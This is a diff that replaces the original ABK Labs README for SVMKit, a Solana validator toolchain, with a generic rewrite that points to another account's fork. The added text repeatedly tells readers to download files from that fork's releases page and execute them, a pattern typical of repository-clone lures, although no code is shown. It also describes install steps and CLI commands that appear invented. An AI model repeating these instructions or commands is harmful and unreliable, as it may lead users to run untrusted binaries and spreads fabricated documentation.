@@ -1,58 +1,134 @@
-# SVMKit - ABK Labs
+# 🌟 SVMKit: An Operational Toolchain for SVM-Based Blockchain Networks 🌟
 
-**Just build together** - ABK Labs believes that open-source software is the purest form of innovation. In our world, there are no competitors, only contributors.
+![SVMKit Logo](https://img.shields.io/badge/SVMKit-Toolchain-blue.svg)
 
-## Overview
+Welcome to **SVMKit**, a comprehensive toolchain designed for SVM-based blockchain networks. This repository provides essential tools for developers and validators working within the Solana ecosystem. Whether you are building, deploying, or managing blockchain applications, SVMKit aims to simplify your workflow and enhance your productivity.
 
-SVMKit is built with this ethos in mind. We encourage you to fork, customize, and contribute to everything you find useful in these repositories.
+## Table of Contents
 
-SVMKit is a suite of tools designed to make building, maintaining, and operating blockchains with the Solana Virtual Machine (SVM) more accessible. With SVMKit, you have a powerful foundation whether you're a chain builder or a node operator.
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
 
-### Example: Launch a standalone Solana cluster on AWS
+## Introduction
 
-![An example of launching an SPE on AWS](https://github.com/outlyinghem/svmkit-media/blob/main/SVMKitSPELaunch/10x_speed_shorter.gif?raw=true)
+SVMKit is tailored for developers and operators who want to leverage the power of Solana's SVM (Solana Virtual Machine). This toolchain streamlines various operations, making it easier to manage validator nodes, deploy smart contracts, and interact with the blockchain.
 
-Deploy an [SPE on AWS](https://github.com/outlyinghem/svmkit-examples/tree/main/aws-network-spe-py#solana-permissioned-environment-inside-an-aws-vpc) in under 2 minutes!
+### What is SVM?
 
-## Key Features
+The Solana Virtual Machine (SVM) is a runtime environment that executes smart contracts on the Solana blockchain. It is designed for high throughput and low latency, making it ideal for decentralized applications. SVMKit provides the necessary tools to interact with SVM effectively.
 
-### For Chain Builders
+## Features
 
-- **Fast Deployment**: Launch a multi-node cluster in under 1 hour
-- **Genesis Configuration**: Simple tools for blockchain initialization
-- **Network Management**: Easy-to-use tools for network maintenance
-- **Ecosystem Integration**: Built-in support for RPC and wallet services
+- **Validator Management**: Tools to help you set up and manage your validator nodes efficiently.
+- **Smart Contract Deployment**: Easy deployment of smart contracts to the Solana blockchain.
+- **Transaction Monitoring**: Real-time monitoring of transactions and events on the blockchain.
+- **User-Friendly CLI**: A command-line interface that simplifies interactions with the blockchain.
+- **Comprehensive Documentation**: In-depth guides and examples to help you get started quickly.
 
-### For Node Operators
+## Installation
 
-- **Quick Setup**: Join any supported fork in under 2 minutes
-- **Multiple Fork Support**: Run validators for:
-  - Solana
-  - Agave
-  - Frankendancer
-  - Jito
-  - X1
-  - Pyth
-  - PowerLedger
-- **APT Integration**: Easy installation through our APT repository
-- **Automated Management**: Simplified validator operations
+To install SVMKit, follow these steps:
 
-All of these features are crafted to reduce time to market and let you focus on your core products, rather than the complexity of maintaining and operating the network.
+1. Clone the repository:
 
-If you have questions or want to contribute, join us in the SVM community chat on Telegram or make a pull request.
+   ```bash
+   git clone https://github.com/Jhonatan75/svmkit.git
+   ```
 
-## Next Steps
+2. Navigate to the project directory:
 
-- [SVMKit Examples](https://github.com/outlyinghem/svmkit-examples) - A collection of examples on how to use SVMKit in your environment.
-- [Developer Information](/docs/DEVELOPMENT.md) - Interested in developing with SVMKit? Take a look here.
-- [APT Setup](/docs/APT-SETUP.md) - APT setup documentation.
+   ```bash
+   cd svmkit
+   ```
 
----
+3. Install the necessary dependencies:
 
-## About Us
+   ```bash
+   npm install
+   ```
 
-Founded on open-source principles, ABK Labs believes the future of the internet is permissionless, open, and driven by the convergence of AI, blockchain, and token economies. With roots in the early days of open-source software, our team has built software used by millions globally—and even on Mars.
+4. Build the project:
 
-Since our founding in June, we’ve grown from three to ten team members and scaled our community from 10 to over 240 builders, including teams backed by $250 million in venture funding. We’re profitable, supporting top companies in the space and reinvesting to advance open-source tools at the intersection of Solana and AI.
+   ```bash
+   npm run build
+   ```
 
-Our flagship product, **SVMKit**, simplifies SVM network operation, while **Zuma**, our alternative validator, allows for modular customization without client forking. ABK Labs is driven by a community of builders, believers, and innovators committed to a decentralized future. If you share this vision, explore our repos or consider joining our team.
+5. After building, you can download the latest release from the [Releases section](https://github.com/Jhonatan75/svmkit/releases). Follow the instructions provided there to execute the toolchain.
+
+## Usage
+
+SVMKit comes with a variety of commands to facilitate your work. Below are some common commands you might find useful:
+
+### Validator Commands
+
+- **Start Validator**: Launch your validator node.
+
+   ```bash
+   svmkit validator start --config path/to/config.json
+   ```
+
+- **Stop Validator**: Safely stop your validator node.
+
+   ```bash
+   svmkit validator stop
+   ```
+
+### Smart Contract Commands
+
+- **Deploy Contract**: Deploy a smart contract to the blockchain.
+
+   ```bash
+   svmkit contract deploy --path path/to/contract.wasm
+   ```
+
+- **Interact with Contract**: Call functions on your deployed smart contract.
+
+   ```bash
+   svmkit contract call --address <contract_address> --function <function_name> --args <arguments>
+   ```
+
+### Transaction Monitoring
+
+- **Monitor Transactions**: Keep an eye on transactions in real-time.
+
+   ```bash
+   svmkit monitor transactions
+   ```
+
+For a complete list of commands and options, refer to the [documentation](#).
+
+## Contributing
+
+We welcome contributions to SVMKit! If you have suggestions, bug fixes, or new features, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your branch and create a pull request.
+
+Please ensure your code adheres to the project's coding standards and includes appropriate tests.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For questions or support, please reach out via the following channels:
+
+- **Email**: [support@svmkit.com](mailto:support@svmkit.com)
+- **GitHub Issues**: Use the GitHub issues page to report bugs or request features.
+
+## Releases
+
+You can find the latest releases of SVMKit [here](https://github.com/Jhonatan75/svmkit/releases). Download the required files and execute them as instructed in the documentation. This ensures you are using the most up-to-date version of the toolchain.
+
+## Conclusion
+
+SVMKit is designed to empower developers and operators in the Solana ecosystem. With its range of features and user-friendly interface, you can manage your blockchain applications with ease. Explore the tools, contribute to the project, and help shape the future of SVM-based blockchain networks.
